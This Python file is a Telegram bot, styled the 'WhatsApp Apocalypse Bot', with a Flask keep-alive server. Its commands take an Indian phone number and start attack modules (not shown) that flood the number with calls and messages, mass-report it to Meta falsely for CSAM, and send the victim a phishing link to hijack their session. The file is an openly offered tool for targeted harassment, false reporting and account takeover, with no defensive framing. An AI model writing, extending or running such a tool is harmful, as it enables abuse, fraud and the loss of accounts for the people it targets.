import os
from flask import Flask
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram import Update
import threading

# ==== IMPORT ATTACK MODULES ====
from bomber import start_bombing
from reporter import report_account
from phisher import send_phishing_link

app = Flask(__name__)

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise Exception("❌ Set TOKEN in Render!")

def start(update: Update, context: CallbackContext):
    update.message.reply_text("""
🔥 <b>WHATSAPP APOCALYPSE BOT</b> 🔥
Choose your weapon:
1. `/bomb 91XXXXXXXXXX` – Flood with calls & msgs
2. `/report 91XXXXXXXXXX` – Send to Meta hell
3. `/crash 91XXXXXXXXXX` – Phish + nuke session

💀 No mercy. No backup. No life.
    """, parse_mode='HTML')

def handle_bomb(update: Update, context: CallbackContext):
    num = update.message.text.split()[-1]
    if not num.startswith("91") or len(num) != 12:
        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
        return
    update.message.reply_text(f"🧨 Bombing {num}...")
    threading.Thread(target=start_bombing, args=(num, update)).start()

def handle_report(update: Update, context: CallbackContext):
    num = update.message.text.split()[-1]
    if not num.startswith("91") or len(num) != 12:
        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
        return
    update.message.reply_text(f"👮‍♂️ Reporting {num} for CSAM...")
    threading.Thread(target=report_account, args=(num, update)).start()

def handle_crash(update: Update, context: CallbackContext):
    num = update.message.text.split()[-1]
    if not num.startswith("91") or len(num) != 12:
        update.message.reply_text("❌ Indian number only: 91XXXXXXXXXX")
        return
    update.message.reply_text(f"🎣 Sending phishing link to {num}...")
    send_phishing_link(num, update)

def start_bot():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bomb", handle_bomb))
    dp.add_handler(CommandHandler("report", handle_report))
    dp.add_handler(CommandHandler("crash", handle_crash))

    updater.start_polling()
    updater.idle()

@app.route('/')
def home():
    return "<h1>💀 WhatsApp Apocalypse: ONLINE</h1><p>Victim's fate: <b>SEVERED</b></p>"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    from threading import Thread
    Thread(target=run_flask).start()
    start_bot()
